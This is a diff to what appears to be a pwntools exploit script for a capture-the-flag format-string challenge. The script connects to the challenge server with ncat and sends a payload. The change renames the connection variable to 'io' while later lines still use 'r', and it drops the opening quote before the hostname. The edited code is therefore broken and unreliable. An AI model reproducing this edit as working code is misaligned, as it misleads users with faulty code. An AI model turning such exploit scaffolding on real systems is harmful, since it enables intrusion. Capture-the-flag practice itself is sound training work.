@@ -44,7 +44,7 @@ context.arch =  "amd64"         #found in file enumeration
 bug_addr =      0x40406c        # nm ./intro-fmt | grep bug
 
 def send_payload(payload):
-        r = process(["ncat", "--ssl-verify", "656c9c6df8d1a3d13267d8f1-1024-intro-pwn-2.challenge.cscg.live", "1337"])
+        io = process(["ncat", "--ssl-verify",  656c9c6df8d1a3d13267d8f1-1024-intro-pwn-2.challenge.cscg.live", "1337"])
         log.info(f"Payload: {repr(payload)}")
         r.sendlineafter(b"What is your name?\n", payload)
         output = r.recvall()
